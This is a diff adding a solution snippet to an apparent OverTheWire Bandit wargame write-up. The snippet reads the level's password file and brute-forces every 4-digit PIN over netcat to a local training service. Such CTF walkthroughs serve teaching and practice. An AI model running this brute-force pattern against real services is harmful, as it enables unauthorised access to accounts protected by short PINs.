@@ -18,6 +18,12 @@ We must brute-force a **4-digit PIN (0000–9999)**, but do it **over a single T
 The server replies “Wrong!” for bad guesses and prints the bandit25 password for the correct one. We’ll stream all guesses through
 
 
+```
+pass=$(cat /etc/bandit_pass/bandit24)
+{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
+| nc localhost 30002 | grep -iv 'wrong'
+```
+
 
 ## SOLUTIONS
 
